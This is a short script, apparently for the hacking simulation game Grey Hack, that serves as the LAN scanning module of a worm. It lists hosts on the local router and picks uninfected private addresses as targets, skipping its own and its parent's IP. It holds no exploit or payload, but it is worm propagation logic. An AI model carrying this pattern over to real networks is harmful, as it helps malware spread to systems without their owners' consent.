// scanner.gs – LAN scanning utilities
import_code("/lib/lib_common.gs")
import_code("/scripts/utils/sanitize_ip.gs")

scanner = {}

scanner.init = function(worm_ip, infected_list, parent_ip)
    scanner.my_ip = worm_ip
    scanner.infected = infected_list
    scanner.parent_ip = parent_ip
    scanner.cached_router = null
    scanner.cache_time = 0
end function

scanner.get_my_router = function()
    if scanner.cached_router != null and time - scanner.cache_time < 300 then
        return scanner.cached_router
    end if
    scanner.cached_router = get_router(scanner.my_ip)
    if scanner.cached_router == null then
        scanner.cached_router = get_router(get_shell.host_computer.lan_ip)
    end if
    scanner.cache_time = time
    return scanner.cached_router
end function

scanner.scan_lan = function()
    router = scanner.get_my_router()
    if router == null then return []
    targets = []
    for ip in router.computers_lan_ip
        if ip == scanner.my_ip then continue
        if scanner.infected.indexOf(ip) != null then continue
        if scanner.parent_ip != null and ip == scanner.parent_ip then continue
        if not is_private_ip(ip) then continue
        targets.push(ip)
    end for
    return targets
end function

return scanner
